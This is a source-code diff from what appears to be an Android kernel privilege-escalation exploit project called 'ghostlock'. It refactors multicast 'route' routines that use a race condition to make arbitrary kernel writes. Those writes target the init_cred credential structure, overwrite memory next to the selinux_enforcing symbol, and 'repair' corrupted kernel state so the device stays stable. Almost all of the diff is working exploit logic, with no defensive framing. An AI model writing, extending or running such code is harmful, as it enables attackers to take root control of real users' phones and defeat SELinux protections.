@@ -345,117 +345,100 @@ namespace ghostlock::route {
 #if defined(__ANDROID__)
 #include "race/threads.hpp"
 #include "route/exploit_procedure.hpp"
+#include "route/route_policy.hpp"
+
+namespace ghostlock::route {
+    /* MulticastPolicy route hooks (Batch 4, D1=B slice 3c). Declared in
+     * route_policy.hpp, defined here because the implementations are
+     * Android-only. The one-shot route keeps its own small stack frame in
+     * do_kernel5_fake_lock_route() and shares only the pure payload encoding. */
+    std::optional<Status> MulticastPolicy::resident_write(
+        session::ExploitSession &exploit_session,
+        const memory::WriteRequest &request) noexcept {
+        if (!exploit_session.profile.multicast_resident()) return std::nullopt;
+        if (!kernel5_resident_start()) {
+            pr_warning("5.x resident multicast setup failed\n");
+            return Status{false};
+        }
+        uintptr_t value = !request.preserve_child
+                              ? 0
+                              : (request.mode == memory::WriteMode::Credential
+                                     ? exploit_session.addresses.data_alias(
+                                           exploit_session.addresses.init_cred_image_addr())
+                                     : exploit_session.addresses.data_alias(
+                                           ghostlock::profile::empty_zero_page()));
+        return Status{kernel5_resident_write(request.target, value) != 0};
+    }
+
+    bool MulticastPolicy::w1_resident_repair(
+        session::ExploitSession &exploit_session) noexcept {
+        if (!exploit_session.profile.multicast_resident()) return true;
+        const profile::MulticastWaiterLayout mcast =
+                exploit_session.profile.multicast_layout();
+        const uintptr_t repair =
+                (exploit_session.addresses.data_alias(
+                     kernel::KIMAGE_TEXT_BASE + mcast.fake_bss_image_offset) +
+                 mcast.fake_lock_offset)
+                & ~static_cast<uintptr_t>(0x1fffff);
+        if (!kernel5_resident_write(
+                exploit_session.addresses.data_alias(
+                    ghostlock::profile::selinux_enforcing()) + 4,
+                repair)) {
+            pr_warning("W1 policycap repair failed\n");
+            kernel5_resident_stop();
+            return false;
+        }
+        return true;
+    }
+
+    bool MulticastPolicy::w2_fast_repair_prebuild(
+        session::ExploitSession &exploit_session) noexcept {
+        const memory::WriteRequest repair_request = memory::WriteRequest::make(
+            exploit_session.addresses.data_alias(
+                exploit_session.addresses.init_cred_image_addr()) + 8,
+            memory::WriteMode::Zero, 1);
+        (exploit_session.heap.current.base) =
+                support::prepare_good_kernel_page(repair_request);
+        if (!(exploit_session.heap.current.base) || !support::stash_prebuilt_page()) {
+            pr_warning("W2 fast repair prebuild failed\n");
+            support::discard_prebuilt_page();
+            return false;
+        }
+        pr_info("W2 fast repair payload prebuilt\n");
+        return true;
+    }
+
+    bool MulticastPolicy::w2_fast_repair_activate(
+        session::ExploitSession &exploit_session) noexcept {
+        if (!support::activate_prebuilt_page()) {
+            pr_warning("W2 fast repair activation failed\n");
+            return false;
+        }
+        const memory::WriteRequest repair_request = memory::WriteRequest::make(
+            exploit_session.addresses.data_alias(
+                exploit_session.addresses.init_cred_image_addr()) + 8,
+            memory::WriteMode::Zero, 1);
+        pr_info("W2b: firing prebuilt init_cred+8 repair\n");
+        exploit_session.race.fast_repair.store(1);
+        const Status repaired = race::run_main_route_threads(repair_request);
+        exploit_session.race.fast_repair.store(0);
+        if (!repaired) {
+            pr_warning("W2 fast repair route failed\n");
+            return false;
+        }
+        return true;
+    }
+} // namespace ghostlock::route
 
 namespace {
+    /* The middleware behavior lives in MulticastPolicy (route_policy.hpp);
+     * this binding keeps the per-route factory shape until the pipeline
+     * composition slice replaces it. */
     class MulticastProcedure final : public ghostlock::session::ExploitProcedure {
     public:
         explicit MulticastProcedure(ghostlock::session::ExploitSession &session)
             : ExploitProcedure(session) {}
 
-    protected:
-        std::optional<Status> resident_write(const memory::WriteRequest &request) override {
-            if (!session_.profile.multicast_resident()) return std::nullopt;
-            if (!route::kernel5_resident_start()) {
-                pr_warning("5.x resident multicast setup failed\n");
-                return Status{false};
-            }
-            uintptr_t value = !request.preserve_child
-                                  ? 0
-                                  : (request.mode == memory::WriteMode::Credential
-                                         ? session_.addresses.data_alias(session_.addresses.init_cred_image_addr())
-                                         : session_.addresses.data_alias(ghostlock::profile::empty_zero_page()));
-            return Status{route::kernel5_resident_write(request.target, value) != 0};
-        }
-
-        uint32_t w1_attempt_cap(uint32_t base) const override {
-            if (session_.profile.multicast_resident()) return base;
-            /* one-shot route cannot safely retry a missed W1 */
-            return 1;
-        }
-
-        bool w2_fast_repair_prebuild() override {
-            const memory::WriteRequest repair_request = memory::WriteRequest::make(
-                session_.addresses.data_alias(session_.addresses.init_cred_image_addr()) + 8,
-                memory::WriteMode::Zero, 1);
-            (session_.heap.current.base) = support::prepare_good_kernel_page(repair_request);
-            if (!(session_.heap.current.base) || !support::stash_prebuilt_page()) {
-                pr_warning("W2 fast repair prebuild failed\n");
-                support::discard_prebuilt_page();
-                return false;
-            }
-            pr_info("W2 fast repair payload prebuilt\n");
-            return true;
-        }
-
-        bool w2_fast_repair_activate() override {
-            if (!support::activate_prebuilt_page()) {
-                pr_warning("W2 fast repair activation failed\n");
-                return false;
-            }
-            const memory::WriteRequest repair_request = memory::WriteRequest::make(
-                session_.addresses.data_alias(session_.addresses.init_cred_image_addr()) + 8,
-                memory::WriteMode::Zero, 1);
-            pr_info("W2b: firing prebuilt init_cred+8 repair\n");
-            session_.race.fast_repair.store(1);
-            Status repaired = race::run_main_route_threads(repair_request);
-            session_.race.fast_repair.store(0);
-            if (!repaired) {
-                pr_warning("W2 fast repair route failed\n");
-                return false;
-            }
-            return true;
-        }
-
-        bool w1_scratch_repair() override {
-            if (session_.profile.multicast_resident()) return true;
-            const profile::MulticastWaiterLayout mcast =
-                    session_.profile.multicast_layout();
-            uintptr_t w1_scratch_poison =
-                    (session_.heap.current.base) + mcast.buffer_size;
-            if (!support::quarantine_reclaim_sockets()) {
-                pr_warning("W1 scratch page quarantine failed\n");
-                return false;
-            }
-            int32_t repaired = 0;
-            uint32_t repair_attempts =
-                    session::g_exploit_session.profile.w1_scratch_repair_attempts();
-            for (uint32_t repair_try = 1; repair_try <= repair_attempts; repair_try++) {
-                pr_info("W1b: private scratch repair attempt %u/%u\n",
-                        repair_try, repair_attempts);
-                const memory::WriteRequest scratch_repair = memory::WriteRequest::make(
-                    w1_scratch_poison, memory::WriteMode::Zero, 1);
-                if (attack_write(scratch_repair, "W1b: private scratch repair")) {
-                    repaired = 1;
-                    break;
-                }
-                usleep(50000);
-            }
-            if (repaired) {
-                pr_success("private scratch repaired; releasing quarantine\n");
-                support::release_quarantined_reclaim_sockets();
-                return true;
-            }
-            pr_warning("private scratch repair failed; keeping page quarantined\n");
-            return false;
-        }
-
-        bool w1_resident_repair() override {
-            if (!session_.profile.multicast_resident()) return true;
-            const profile::MulticastWaiterLayout mcast =
-                    session_.profile.multicast_layout();
-            uintptr_t repair =
-                    (session_.addresses.data_alias(kernel::KIMAGE_TEXT_BASE + mcast.fake_bss_image_offset) +
-                     mcast.fake_lock_offset)
-                    & ~static_cast<uintptr_t>(0x1fffff);
-            if (!route::kernel5_resident_write(
-                session_.addresses.data_alias(ghostlock::profile::selinux_enforcing()) + 4,
-                repair)) {
-                pr_warning("W1 policycap repair failed\n");
-                route::kernel5_resident_stop();
-                return false;
-            }
-            return true;
-        }
     };
 } // namespace
 
